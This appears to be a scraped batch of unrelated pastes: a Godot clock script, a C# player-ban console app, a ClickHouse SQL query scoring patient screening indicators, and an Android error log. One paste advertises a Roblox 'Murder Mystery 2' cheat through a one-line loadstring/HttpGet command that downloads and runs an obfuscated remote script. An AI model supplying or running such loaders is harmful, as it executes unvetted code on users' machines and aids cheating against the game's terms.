		M = 0
		H += 1
	if H >= 24:
		H = 0  # Reset at midnight

	set_text(""%02d:%02d:%02d"" % [H, M, S])

	# Debugging to verify correct updates
	print(""Time Updated:"", ""%02d:%02d:%02d"" % [H, M, S])

func _input(event: InputEvent) -> void:
	if event is InputEventKey and event.pressed:
		if event.keycode in [KEY_7, KEY_8, KEY_9, KEY_0]:
			fade_in_text()

func fade_in_text() -> void:
	var tween = create_tween()
	tween.tween_property(self, ""modulate:a"", 1.0, 1.0)  # Fade in over 1 second
	hide_timer.start()  # Start countdown to fade out

func _on_hide_timer_timeout() -> void:
	var tween = create_tween()
	tween.tween_property(self, ""modulate:a"", 0.0, 1.5)  # Fade out smoothly
"
ipH9vJiW,Murder Mystery 2 by Dave,WoZiMu,C++,Wednesday 14th of May 2025 12:01:21 PM CDT,"📅 This PasteBin has been updated for new MURDER MYSTERY 2 👻 - Update date 2025-05-14 11:00 AM

🚀 Discord: https://discord.com/invite/JEw82ZEGEE 🚀

💻 Script: (Used in the video)
loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/MM2/refs/heads/main/obf/script.lua'))()
--{By Dave}--

📝 Updates: (LAST UPDATE : 2025-05-14 MURDER MYSTERY 2 👻)
    🔪 Weapon Spawner (Visual)
    📜 Anti AFK + Auto Hide when Idle
    🛡️ Optimized Performance for Lower-End Devices

🔥 𝗡𝗼𝘁𝗶𝗰𝗲 🔥
Using third-party scripts in games may violate the game’s Terms of Service and could lead to bans or account suspension. Use scripts responsibly and at your own risk. I’m not responsible for any account losses.

⚠️ NOTE: Always wait 5–10 seconds after the game loads before executing the script to avoid crashes or errors.
"
Zz37g7Br,Untitled,drakon-firestone,C++,Wednesday 14th of May 2025 11:30:09 AM CDT,"#include <iostream>

using namespace std;
 
int main()
{
 
    cout << ""Hey"" << endl;
 
 
    return 0;
}"
p1h8Cpmn,Untitled,Rodunskiy,C#,Wednesday 14th of May 2025 11:17:11 AM CDT,"namespace CSLight
{
    class Program
    {
        static void Main(string[] args)
        {
            const string AddPlayer = ""1"";
            const string BanPlayer = ""2"";
            const string UnbanPlayer = ""3"";
            const string DeletePlayer = ""4"";
            const string PrintAllPlayers = ""5"";
            const string ExitProgram = ""6"";

            Database database = new Database();

            bool isWorking = true;

            while (isWorking)
            {
                Console.WriteLine($""{AddPlayer})Добавить игрока.\n{BanPlayer})Забанить игрока.\n{UnbanPlayer})Разбанить игрока.\n{DeletePlayer})Удалить игрока."" +
                                  $""\n{PrintAllPlayers})Вывести список всех игроков.\n{ExitProgram})Выход из программы."");
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddPlayer:
                        database.AddPlayer();
                        break;

                    case BanPlayer:
                        database.BanPlayer();
                        break;

                    case UnbanPlayer:
                        database.UnbanPlayer();
                        break;

                    case DeletePlayer:
                        database.DeletePlayer();
                        break;

                    case PrintAllPlayers:
                        database.PrintAllPlayers();
                        break;

                    case ExitProgram:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Неверный выбор. Попробуйте еще раз."");
                        break;
                }
            }
        }
    }

    class Database
    {
        private Dictionary<int, Player> _players = new Dictionary<int, Player>();
        private int _nextIdPlayer = 1;

        public void AddPlayer()
        {
            Console.WriteLine(""Введите ник игрока."");
            string nickname = Console.ReadLine();

            Console.WriteLine(""Введите уровень"");
            int level = ReadInt(""Уровень должен быть числом. Попробуйте еще раз:"");

            Player player = new Player(_nextIdPlayer, nickname, level);

            _players.Add(_nextIdPlayer, player);
            _nextIdPlayer++;

            Console.WriteLine($""Игрок {nickname} добавлен с ID {player.Id}"");
        }

        public void BanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");
            if (TryGetPlayer(id, out Player player))
            {
                player.Ban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) забанен."");
            }
        }

        public void UnbanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");
            if (TryGetPlayer(id, out Player player))
            {
                player.Unban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) разбанен."");
            }
        }

        public void DeletePlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");
            if (_players.Remove(id, out Player player))
            {
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) удален."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {id} не найден."");
            }
        }

        public void PrintAllPlayers()
        {
            if (_players.Count == 0)
            {
                Console.WriteLine(""В базе нет игроков."");
            }
            else
            {
                Console.WriteLine(""Список игроков:"");
                foreach (var player in _players.Values)
                {
                    player.ShowInfo();
                }
            }
        }

        private bool TryGetPlayer(int id, out Player player)
        {
            if (_players.TryGetValue(id, out player))
            {
                return true;
            }

            Console.WriteLine($""Игрок с ID {id} не найден."");
            return false;
        }

        private int ReadInt(string errorMessage)
        {
            int result;
            while (!int.TryParse(Console.ReadLine(), out result))
            {
                Console.WriteLine(errorMessage);
            }
            return result;
        }
    }

    class Player
    {
        public int Id { get; private set; }
        public string Nickname { get; private set; }
        public int Level { get; private set; }
        public bool IsBanned { get; private set; }

        public Player(int uniqueNumber, string nickname, int lvl, bool isBanned = false)
        {
            Id = uniqueNumber;
            Nickname = nickname;
            Level = lvl;
            IsBanned = isBanned;
        }

        public void Ban()
        {
            IsBanned = true;
        }

        public void Unban()
        {
            IsBanned = false;
        }

        public void ShowInfo()
        {
            string status = IsBanned ? ""Забанен"" : ""Активен"";
            Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: {status}"");
        }
    }
}"
d2ixp0KF,test,temaon_lieto,SQL,Wednesday 14th of May 2025 11:03:33 AM CDT,"WITH reporting_periods AS (SELECT rp.*,
                                  toDate32('2025-05-01')                                        AS period_end_date,
                                  if(original_period_type = 'DAY',
                                     dateDiff('day', period_end_date - INTERVAL original_period_value DAY,
                                              period_end_date),
                                     dateDiff('day', period_end_date - INTERVAL original_period_value YEAR,
                                              period_end_date)
                                  )                                                             AS calculated_period_start_days,
                                  (period_end_date - INTERVAL calculated_period_start_days DAY) AS period_start_date
                           FROM dict_reporting_periods rp),
     period_interval AS (SELECT min(reporting_periods.period_start_date) AS period_start,
                                max(reporting_periods.period_end_date)   AS period_end
                         FROM reporting_periods),
     patients AS (SELECT DISTINCT ON (id) if(declaration_status = 'ACTIVE', declaration_end_date,
                                             declaration_updated_at)                             AS declaration_end_date,
                                          period_interval.period_start,
                                          period_interval.period_end,
                                          declaration_start_date,
                                          age('day', date_of_birth, period_interval.period_end)  AS current_age_in_days,
                                          age('year', date_of_birth, period_interval.period_end) AS current_age_in_years,
                                          cascade_lvl02_patient_declarations.id,
                                          cascade_lvl02_patient_declarations.gender,
                                          cascade_lvl02_patient_declarations.full_address,
                                          cascade_lvl02_patient_declarations.patient_full_name,
                                          cascade_lvl02_patient_declarations.legal_entity_id,
                                          cascade_lvl02_patient_declarations.employee_id,
                                          cascade_lvl02_patient_declarations.doctor_full_name,
                                          cascade_lvl02_patient_declarations.doctor_position,
                                          cascade_lvl02_patient_declarations.division_id
                  FROM cascade_lvl02_patient_declarations,
                       period_interval
                  WHERE cascade_lvl02_patient_declarations.legal_entity_id = 3228
                    AND (declaration_start_date <= toDate32('2025-05-14 23:59:59') AND
                         declaration_end_date >= toDate32('2020-01-01 00:00:00'))),
     joined_resources AS (SELECT cascade_lvl01_progress_diseases_services.id,
                                 cascade_lvl01_progress_diseases_services.code,
                                 cascade_lvl01_progress_diseases_services.employee_id,
                                 cascade_lvl01_progress_diseases_services.legal_entity_id,
                                 cascade_lvl01_progress_diseases_services.asserted_date,
                                 cascade_lvl01_progress_diseases_services.encounter_id,
                                 cascade_lvl01_progress_diseases_services.patient_id,
                                 cascade_lvl01_progress_diseases_services.status,
                                 cascade_lvl01_progress_diseases_services.resource_type
                          FROM cascade_lvl01_progress_diseases_services,
                               period_interval
                          WHERE cascade_lvl01_progress_diseases_services.legal_entity_id = 3228
                            AND cascade_lvl01_progress_diseases_services.resource_type IN
                                ('observation', 'diagnostic_report', 'service_request')
                            AND (asserted_date >= period_interval.period_start AND
                                 asserted_date <= period_interval.period_end)),
     progress_disease_codes AS (SELECT cascade_lvl00_progress_disease_codes.id,
                                       cascade_lvl00_progress_disease_codes.code,
                                       cascade_lvl00_progress_disease_codes.employee_id,
                                       cascade_lvl00_progress_disease_codes.legal_entity_id,
                                       cascade_lvl00_progress_disease_codes.asserted_date,
                                       cascade_lvl00_progress_disease_codes.encounter_id,
                                       cascade_lvl00_progress_disease_codes.patient_id,
                                       cascade_lvl00_progress_disease_codes.role,
                                       cascade_lvl00_progress_disease_codes.code_type
                                FROM cascade_lvl00_progress_disease_codes,
                                     period_interval
                                WHERE cascade_lvl00_progress_disease_codes.legal_entity_id = 3228
                                  AND cascade_lvl00_progress_disease_codes.ehealth_status = 'finished'
                                  AND (asserted_date <= period_interval.period_end)),
     actions AS (SELECT cascade_lvl00_actions.id,
                        cascade_lvl00_actions.code,
                        cascade_lvl00_actions.patient_id,
                        cascade_lvl00_actions.asserted_date
                 FROM cascade_lvl00_actions,
                      period_interval
                 WHERE cascade_lvl00_actions.legal_entity_id = 3228
                   AND cascade_lvl00_actions.code IN ('K45', 'D45', 'T45')
                   AND (asserted_date >= period_interval.period_start AND asserted_date <= period_interval.period_end)),
     joined_groups AS (SELECT cascade_lvl00_progress_disease_groups.*,
                              reporting_periods.original_period_type,
                              reporting_periods.original_period_value,
                              reporting_periods.calculated_period_start_days,
                              reporting_periods.period_start_date,
                              reporting_periods.period_end_date
                       FROM cascade_lvl00_progress_disease_groups
                                JOIN reporting_periods ON cascade_lvl00_progress_disease_groups.date_restriction =
                                                          reporting_periods.period_name),
     observations AS (SELECT joined_resources.code            AS code,
                             joined_resources.legal_entity_id AS legal_entity_id,
                             joined_resources.asserted_date   AS asserted_date,
                             joined_resources.patient_id      AS patient_id,
                             joined_resources.status          AS status,
                             joined_resources.resource_type   AS resource_type
                      FROM joined_resources
                      WHERE joined_resources.resource_type = 'observation'
                        AND joined_resources.status = 'valid'),
     diagnostic_reports AS (SELECT joined_resources.code            AS code,
                                   joined_resources.legal_entity_id AS legal_entity_id,
                                   joined_resources.asserted_date   AS asserted_date,
                                   joined_resources.patient_id      AS patient_id,
                                   joined_resources.status          AS status,
                                   joined_resources.resource_type   AS resource_type
                            FROM joined_resources
                            WHERE joined_resources.resource_type = 'diagnostic_report'
                              AND joined_resources.status = 'final'),
     service_requests AS (SELECT joined_resources.code            AS code,
                                 joined_resources.legal_entity_id AS legal_entity_id,
                                 joined_resources.asserted_date   AS asserted_date,
                                 joined_resources.patient_id      AS patient_id,
                                 joined_resources.status          AS status,
                                 joined_resources.resource_type   AS resource_type
                          FROM joined_resources
                          WHERE joined_resources.resource_type = 'service_request'
                            AND joined_resources.status IN ('active', 'completed')),
     patient_joined_groups AS (SELECT patients.patient_full_name,
                                      patients.current_age_in_years,
                                      patients.id     AS patient_id,
                                      joined_groups.*,
                                      patients.gender AS patient_gender
                               FROM patients,
                                    joined_groups),
     patient_joined_groups_with_services AS (SELECT patient_joined_groups.patient_id,
                                                    patient_joined_groups.indicator_name,
                                                    patient_joined_groups.group_name,
                                                    jrsr.*
                                             FROM patient_joined_groups
                                                      JOIN service_requests jrsr
                                                           ON patient_joined_groups.need_to_check_service_request_codes =
                                                              TRUE AND
                                                              jrsr.patient_id = patient_joined_groups.patient_id AND
                                                              jrsr.asserted_date >=
                                                              patient_joined_groups.period_start_date AND
                                                              jrsr.asserted_date <=
                                                              patient_joined_groups.period_end_date AND
                                                              (patient_joined_groups.need_to_check_service_statuses AND
                                                               has(patient_joined_groups.service_statuses, jrsr.status))
                                             WHERE (patient_joined_groups.need_to_check_service_request_codes = TRUE AND
                                                    arrayExists(x -> x = jrsr.code,
                                                                patient_joined_groups.condition_service_request_codes)) SETTINGS allow_experimental_join_condition = 1),
     patient_joined_groups_with_dos AS (SELECT patient_joined_groups.patient_id,
                                               patient_joined_groups.indicator_name,
                                               patient_joined_groups.group_name,
                                               jrdo.*
                                        FROM patient_joined_groups
                                                 JOIN diagnostic_reports jrdo
                                                      ON (patient_joined_groups.need_to_check_diagnostic_report_codes =
                                                          TRUE OR
                                                          patient_joined_groups.need_to_check_optional_observation_codes =
                                                          TRUE) AND
                                                         jrdo.patient_id = patient_joined_groups.patient_id AND
                                                         has(patient_joined_groups.condition_diagnostic_report_codes,
                                                             jrdo.code) AND jrdo.asserted_date >=
                                                                            patient_joined_groups.period_start_date AND
                                                         jrdo.asserted_date <= patient_joined_groups.period_end_date
                                        WHERE (patient_joined_groups.need_to_check_diagnostic_report_codes = TRUE AND
                                               arrayExists(x -> x = jrdo.code,
                                                           patient_joined_groups.condition_diagnostic_report_codes) AND
                                               (NOT patient_joined_groups.need_to_check_optional_observation_codes = TRUE OR
                                                jrdo.asserted_date <
                                                toDate('2024-06-01'))) SETTINGS allow_experimental_join_condition = 1),
     patient_joined_groups_with_observations AS (SELECT patient_joined_groups.patient_id,
                                                        patient_joined_groups.indicator_name,
                                                        patient_joined_groups.group_name,
                                                        jro.*
                                                 FROM patient_joined_groups
                                                          JOIN observations jro
                                                               ON (patient_joined_groups.need_to_check_observation_codes =
                                                                   TRUE OR
                                                                   patient_joined_groups.need_to_check_optional_observation_codes =
                                                                   TRUE) AND
                                                                  jro.patient_id = patient_joined_groups.patient_id AND
                                                                  jro.asserted_date >=
                                                                  patient_joined_groups.period_start_date AND
                                                                  jro.asserted_date <=
                                                                  patient_joined_groups.period_end_date AND
                                                                  (has(patient_joined_groups.condition_observation_codes, jro.code) OR
                                                                   has(
                                                                           patient_joined_groups.condition_optional_observation_codes,
                                                                           jro.code))
                                                 WHERE ((patient_joined_groups.need_to_check_observation_codes AND
                                                         arrayExists(x -> x = jro.code,
                                                                     patient_joined_groups.condition_observation_codes)) OR
                                                        (patient_joined_groups.need_to_check_optional_observation_codes AND
                                                         arrayExists(x -> x = jro.code,
                                                                     patient_joined_groups.condition_optional_observation_codes))) SETTINGS allow_experimental_join_condition = 1),
     patient_joined_groups_with_reasons AS (SELECT patient_joined_groups.patient_id,
                                                   patient_joined_groups.indicator_name,
                                                   patient_joined_groups.group_name,
                                                   pdrc.*
                                            FROM patient_joined_groups
                                                     JOIN progress_disease_codes pdrc
                                                          ON patient_joined_groups.need_to_check_reason_code = TRUE AND
                                                             pdrc.patient_id = patient_joined_groups.patient_id AND
                                                             has(patient_joined_groups.condition_reason_code, pdrc.code) AND
                                                             pdrc.asserted_date >=
                                                             patient_joined_groups.period_start_date AND
                                                             pdrc.asserted_date <= patient_joined_groups.period_end_date
                                            WHERE (patient_joined_groups.need_to_check_reason_code AND
                                                   arrayExists(x -> x = pdrc.code,
                                                               patient_joined_groups.condition_reason_code)) SETTINGS allow_experimental_join_condition = 1),
     patient_joined_groups_with_actions AS (SELECT patient_joined_groups.patient_id,
                                                   patient_joined_groups.indicator_name,
                                                   patient_joined_groups.group_name,
                                                   a.*
                                            FROM patient_joined_groups
                                                     JOIN actions a
                                                          ON patient_joined_groups.need_to_check_condition_action_codes =
                                                             TRUE AND
                                                             a.patient_id = patient_joined_groups.patient_id AND
                                                             a.asserted_date >=
                                                             patient_joined_groups.period_start_date AND
                                                             a.asserted_date <=
                                                             patient_joined_groups.period_end_date AND
                                                             has(patient_joined_groups.condition_action_codes, a.code)
                                            WHERE (patient_joined_groups.need_to_check_condition_action_codes = TRUE AND
                                                   arrayExists(x -> x = a.code,
                                                               patient_joined_groups.condition_action_codes)) SETTINGS allow_experimental_join_condition = 1),
     patient_joined_groups_with_pdc AS (SELECT patient_joined_groups.patient_id,
                                               patient_joined_groups.indicator_name,
                                               patient_joined_groups.group_name,
                                               pdc.*
                                        FROM patient_joined_groups
                                                 JOIN progress_disease_codes pdc
                                                      ON (patient_joined_groups.need_to_check_condition_codes = TRUE OR
                                                          patient_joined_groups.need_to_check_condition_exclude_codes =
                                                          TRUE) AND
                                                         pdc.patient_id = patient_joined_groups.patient_id AND
                                                         pdc.asserted_date <= patient_joined_groups.period_end_date AND
                                                         (has(patient_joined_groups.condition_codes, pdc.code) OR
                                                          has(patient_joined_groups.condition_exclude_codes, pdc.code))
                                        WHERE (pdc.asserted_date <= patient_joined_groups.period_end_date AND
                                               ((patient_joined_groups.need_to_check_condition_codes = TRUE AND
                                                 arrayExists(x -> x = pdc.code,
                                                             patient_joined_groups.condition_codes)) OR
                                                (patient_joined_groups.need_to_check_condition_exclude_codes = TRUE AND
                                                 arrayExists(x -> x = pdc.code,
                                                             patient_joined_groups.condition_exclude_codes)))) SETTINGS allow_experimental_join_condition = 1),
     patient_groups AS (SELECT first_value(patient_joined_groups.patient_full_name),
                               first_value(patient_joined_groups.current_age_in_years),
                               patient_joined_groups.patient_id                                                                                            AS patient_id,
                               patient_joined_groups.indicator_name                                                                                        AS indicator_name,
                               patient_joined_groups.group_name                                                                                            AS group_name,
                               groupUniqArray(patient_joined_groups_with_dos.code)                                                                         AS result_condition_diagnostic_report_codes,
                               groupUniqArray(patient_joined_groups_with_observations.code)                                                                AS result_condition_observation_codes,
                               groupUniqArray(patient_joined_groups_with_services.code)                                                                    AS result_condition_service_request_codes,
                               groupUniqArray(patient_joined_groups_with_reasons.code)                                                                     AS result_reason_codes,
                               groupUniqArray(patient_joined_groups_with_actions.code)                                                                     AS result_action_codes,
                               groupUniqArray(patient_joined_groups_with_pdc.code)                                                                         AS result_condition_codes,
                               first_value(patient_gender)                                                                                                 AS patient_gender,
                               first_value(patient_joined_groups.current_age_in_years)                                                                     AS patient_age,
                               first_value(patient_joined_groups.need_to_check_female_age)                                                                 AS need_to_check_female_age,
                               first_value(patient_joined_groups.need_to_check_male_age)                                                                   AS need_to_check_male_age,
                               first_value(patient_joined_groups.need_to_check_reason_code)                                                                AS need_to_check_reason_code,
                               first_value(patient_joined_groups.need_to_check_condition_codes)                                                            AS need_to_check_condition_codes,
                               first_value(patient_joined_groups.need_to_check_condition_exclude_codes)                                                    AS need_to_check_condition_exclude_codes,
                               first_value(patient_joined_groups.need_to_check_observation_codes)                                                          AS need_to_check_observation_codes,
                               first_value(patient_joined_groups.need_to_check_service_request_codes)                                                      AS need_to_check_service_request_codes,
                               first_value(patient_joined_groups.need_to_check_diagnostic_report_codes)                                                    AS need_to_check_diagnostic_report_codes,
                               first_value(patient_joined_groups.need_to_check_condition_action_codes)                                                     AS need_to_check_action_codes,
                               first_value(patient_joined_groups.need_to_check_optional_observation_codes)                                                 AS need_to_check_optional_observation_codes,
                               first_value(patient_joined_groups.condition_female_age_from)                                                                AS condition_female_age_from,
                               first_value(patient_joined_groups.condition_female_age_to)                                                                  AS condition_female_age_to,
                               first_value(patient_joined_groups.condition_male_age_from)                                                                  AS condition_male_age_from,
                               first_value(patient_joined_groups.condition_male_age_to)                                                                    AS condition_male_age_to,
                               (patient_gender IS NULL OR
                                (first_value(patient_joined_groups.skip_male) AND patient_gender = 0)
                                   OR (group_name IN
                                       ('hiv_screening_no_risk', 'checkup_40_64_with_risk', 'checkup_65_plus_no_risk',
                                        'tb_screening_no_risk',
                                        'hypertension_eval_no_risk'))
                                   OR (first_value(patient_joined_groups.skip_female) AND patient_gender = 1)
                                   OR (need_to_check_male_age AND patient_gender = 0 AND
                                       patient_age NOT BETWEEN condition_male_age_from AND condition_male_age_to)
                                   OR (need_to_check_female_age AND patient_gender = 1 AND
                                       patient_age NOT BETWEEN condition_female_age_from AND condition_female_age_to)
                                   )                                                                                                                       AS skip_check,
                               first_value(patient_joined_groups.is_no_risk)                                                                               AS is_no_risk,

                               first_value(patient_joined_groups.condition_reason_code)                                                                    AS condition_reason_codes,
                               first_value(patient_joined_groups.condition_action_codes)                                                                   AS condition_action_codes,
                               first_value(patient_joined_groups.condition_codes)                                                                          AS condition_codes,
                               first_value(patient_joined_groups.condition_exclude_codes)                                                                  AS condition_exclude_codes,
                               first_value(patient_joined_groups.condition_observation_codes)                                                              AS condition_observation_codes,
                               first_value(patient_joined_groups.condition_optional_observation_codes)                                                     AS condition_optional_observation_codes,
                               first_value(patient_joined_groups.condition_diagnostic_report_codes)                                                        AS condition_diagnostic_report_codes,
                               first_value(patient_joined_groups.condition_service_request_codes)                                                          AS condition_service_request_codes,

                               (need_to_check_reason_code AND length(result_reason_codes) = 0)                                                             AS force_quit_reason_check,
                               (need_to_check_action_codes AND length(result_action_codes) = 0)                                                            AS force_quit_action_check,
                               (need_to_check_condition_codes AND length(result_condition_codes) = 0)                                                      AS force_quit_condition_check,
                               (need_to_check_service_request_codes AND
                                length(result_condition_service_request_codes) =
                                0)                                                                                                                         AS force_quit_service_request_check,
                               (need_to_check_observation_codes AND length(result_condition_observation_codes) =
                                                                    0)                                                                                     AS force_quit_observation_check,
                               (need_to_check_diagnostic_report_codes AND
                                length(result_condition_diagnostic_report_codes) =
                                0)                                                                                                                         AS force_quit_diagnostic_report_check,
                               (need_to_check_condition_exclude_codes AND length(result_condition_codes) =
                                                                          0)                                                                               AS force_quit_condition_exclude_check,

                               if(skip_check OR NOT need_to_check_diagnostic_report_codes, true,
                                  if(force_quit_diagnostic_report_check, false,
                                     need_to_check_diagnostic_report_codes AND
                                     arrayExists(x -> has(result_condition_diagnostic_report_codes, x),
                                                 condition_diagnostic_report_codes)
                                  ))                                                                                                                       AS diagnostic_report_check,
                               if(skip_check OR NOT need_to_check_reason_code, true,
                                  if(force_quit_reason_check, false,
                                     arrayExists(x -> has(condition_reason_codes, x), result_condition_codes) OR
                                     arrayExists(x -> has(condition_reason_codes, x), result_reason_codes)
                                  ))                                                                                                                       AS reason_check,
                               if(skip_check OR NOT need_to_check_action_codes, true,
                                  if(force_quit_action_check, false,
                                     arrayExists(x -> has(condition_action_codes, x), result_action_codes)
                                  ))                                                                                                                       AS action_check,
                               if(skip_check OR NOT need_to_check_condition_codes, true,
                                  if(force_quit_condition_check, false, arrayExists(x -> has(condition_codes, x),
                                                                                    result_condition_codes)))                                              AS condition_check,
                               if(skip_check OR NOT need_to_check_service_request_codes, true,
                                  if(force_quit_service_request_check, false,
                                     need_to_check_service_request_codes AND
                                     arrayExists(x -> has(condition_service_request_codes, x),
                                                 result_condition_service_request_codes)))                                                                 AS service_request_check,
                               if(skip_check OR NOT need_to_check_condition_exclude_codes, true,
                                  if(force_quit_condition_exclude_check, true,
                                     NOT arrayExists(x -> has(condition_exclude_codes, x),
                                                     result_condition_codes)))                                                                             AS condition_exclude_check,
                               if(skip_check OR NOT need_to_check_observation_codes, true,
                                  if(force_quit_observation_check, false,
                                     (
                                         (NOT need_to_check_optional_observation_codes AND
                                          length(arrayIntersect(condition_observation_codes,
                                                                result_condition_observation_codes)) =
                                          length(condition_observation_codes))
                                             OR (
                                             need_to_check_optional_observation_codes AND
                                             (
                                                 (length(arrayIntersect(condition_observation_codes,
                                                                        result_condition_observation_codes)) =
                                                  length(condition_observation_codes) AND
                                                  ((need_to_check_diagnostic_report_codes AND diagnostic_report_check) OR
                                                   (need_to_check_service_request_codes AND service_request_check)))
                                                     OR length(arrayIntersect(arrayConcat(condition_observation_codes,
                                                                                          condition_optional_observation_codes),
                                                                              result_condition_observation_codes)) =
                                                        length(arrayConcat(condition_observation_codes,
                                                                           condition_optional_observation_codes))
                                                 )
                                             )
                                         )
                                  )
                               )                                                                                                                           AS observation_check,
                               CASE
                                   WHEN skip_check OR
                                        (need_to_check_condition_exclude_codes AND NOT condition_exclude_check)
                                       THEN 'no_need_done'
                                   WHEN condition_check AND action_check AND reason_check AND condition_exclude_check
                                       AND if(need_to_check_optional_observation_codes = TRUE, observation_check,
                                              (need_to_check_observation_codes AND observation_check) OR
                                              ((need_to_check_service_request_codes AND service_request_check) OR
                                               (need_to_check_diagnostic_report_codes AND diagnostic_report_check)))
                                       THEN 'done'
                                   WHEN need_to_check_condition_codes AND condition_check AND
                                        need_to_check_condition_exclude_codes AND condition_exclude_check
                                       THEN 'need_done'
                                   WHEN (is_no_risk AND NOT condition_exclude_check) OR
                                        (NOT is_no_risk AND NOT condition_check) THEN 'no_need_done'
                                   ELSE 'need_done'
                                   END                                                                                                                     AS status,
                               row_number() OVER (PARTITION BY patient_id, indicator_name ORDER BY if(status = 'done', 1, if(status = 'need_done', 2, 3))) AS status_rank
                        FROM patient_joined_groups
                                 LEFT JOIN patient_joined_groups_with_dos
                                           USING patient_id, indicator_name, group_name LEFT
                                 JOIN patient_joined_groups_with_services
                                      USING patient_id, indicator_name, group_name LEFT
                                 JOIN patient_joined_groups_with_observations
                                      USING patient_id, indicator_name, group_name LEFT
                                 JOIN patient_joined_groups_with_reasons
                                      USING patient_id, indicator_name, group_name LEFT
                                 JOIN patient_joined_groups_with_actions
                                      USING patient_id, indicator_name, group_name LEFT
                                 JOIN patient_joined_groups_with_pdc USING patient_id, indicator_name, group_name
                        GROUP BY patient_joined_groups.patient_id, patient_joined_groups.indicator_name,
                                 patient_joined_groups.group_name)
SELECT patients.id,
       patients.patient_full_name,
       patients.legal_entity_id,
       patients.current_age_in_years,
       patients.doctor_full_name,
       any(if(indicators.indicator_name = 'breast_completed', indicators.status, NULL))     AS breast_completed_status,
       any(if(indicators.indicator_name = 'breast_referral', indicators.status, NULL))      AS breast_referral_status,
       any(if(indicators.indicator_name = 'checkup_40_64', indicators.status, NULL))        AS checkup_40_64_status,
       any(if(indicators.indicator_name = 'checkup_65_plus', indicators.status, NULL))      AS checkup_65_plus_status,
       any(if(indicators.indicator_name = 'colorectal_completed', indicators.status,
              NULL))                                                                        AS colorectal_completed_status,
       any(if(indicators.indicator_name = 'colorectal_referral', indicators.status,
              NULL))                                                                        AS colorectal_referral_status,
       any(if(indicators.indicator_name = 'cv_risk_assessment', indicators.status,
              NULL))                                                                        AS cv_risk_assessment_status,
       any(if(indicators.indicator_name = 'diabetes_screening', indicators.status,
              NULL))                                                                        AS diabetes_screening_status,
       any(if(indicators.indicator_name = 'hiv_screening', indicators.status, NULL))        AS hiv_screening_status,
       any(if(indicators.indicator_name = 'hypertension_eval', indicators.status, NULL))    AS hypertension_eval_status,
       any(if(indicators.indicator_name = 'prostate_completed', indicators.status,
              NULL))                                                                        AS prostate_completed_status,
       any(if(indicators.indicator_name = 'prostate_referral', indicators.status, NULL))    AS prostate_referral_status,
       any(if(indicators.indicator_name = 'tb_screening', indicators.status, NULL))         AS tb_screening_status,
       '{' || arrayStringConcat(
               arrayMap(
                       (name, status, sr_codes, do_codes, obs_codes, condition_codes, action_codes) ->
                           concat('""', name, '"": {',
                                  '""status"": ""', status, '"",',
                                  '""sr_codes"": [', arrayStringConcat(arrayMap(x -> concat('""', x, '""'), sr_codes), ','),
                                  '],',
                                  '""do_codes"": [', arrayStringConcat(arrayMap(x -> concat('""', x, '""'), do_codes), ','),
                                  '],',
                                  '""obs_codes"": [',
                                  arrayStringConcat(arrayMap(x -> concat('""', x, '""'), obs_codes), ','), '],',
                                  '""action_codes"": [',
                                  arrayStringConcat(arrayMap(x -> concat('""', x, '""'), action_codes), ','), ']',
                                  '}'),
                       groupArray(indicators.indicator_name),
                       groupArray(indicators.status),
                       groupArray(indicators.result_condition_service_request_codes),
                       groupArray(indicators.result_condition_diagnostic_report_codes),
                       groupArray(indicators.result_condition_observation_codes),
                       groupArray(indicators.result_condition_codes),
                       groupArray(indicators.result_action_codes)
               ),
               ','
              ) || '}'                                                                      AS indicator_data_json
FROM patients
         JOIN patient_groups indicators ON status_rank = 1 AND patients.id = patient_groups.patient_id
WHERE patient_groups.status_rank = 1
GROUP BY patients.id, patients.patient_full_name, patients.legal_entity_id, patients.current_age_in_years,
         patients.doctor_full_name
ORDER BY patients.patient_full_name ASC NULLS LAST COLLATE 'uk'
LIMIT 15 OFFSET 0"
niR6MQ1t,2025-05-14T18:01:35.271628,powerampache,PHP,Wednesday 14th of May 2025 11:01:36 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getAlbums() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""timeout\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""timeout\"" }"",""stackTrace"":[]}"
